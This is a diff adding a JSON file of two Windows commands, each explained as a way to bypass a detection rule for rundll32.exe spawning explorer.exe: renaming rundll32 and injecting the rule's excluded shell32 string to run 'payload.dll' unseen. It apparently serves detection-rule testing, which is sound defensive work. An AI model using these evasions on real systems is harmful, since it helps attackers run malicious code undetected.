@@ -1,0 +1,10 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\rundll32.exe C:\\Temp\\run_update.exe && C:\\Temp\\run_update.exe payload.dll,SpawnExplorer",
+    "explanation": "By renaming rundll32.exe to another filename (e.g., run_update.exe) before execution, the ParentImage will no longer end with '\\rundll32.exe'. This breaks the initial 'selection' condition, bypassing the rule entirely when explorer.exe is spawned."
+  },
+  {
+    "output": "rundll32.exe payload.dll,EntryPoint \"\\shell32.dll,Control_RunDLL\"",
+    "explanation": "This technique exploits the rule's exact string exclusion filter. By passing the excluded string '\\shell32.dll,Control_RunDLL' as a dummy argument to the malicious DLL, the 'filter' condition triggers and prevents the alert from firing, even though rundll32.exe still spawns explorer.exe."
+  }
+]
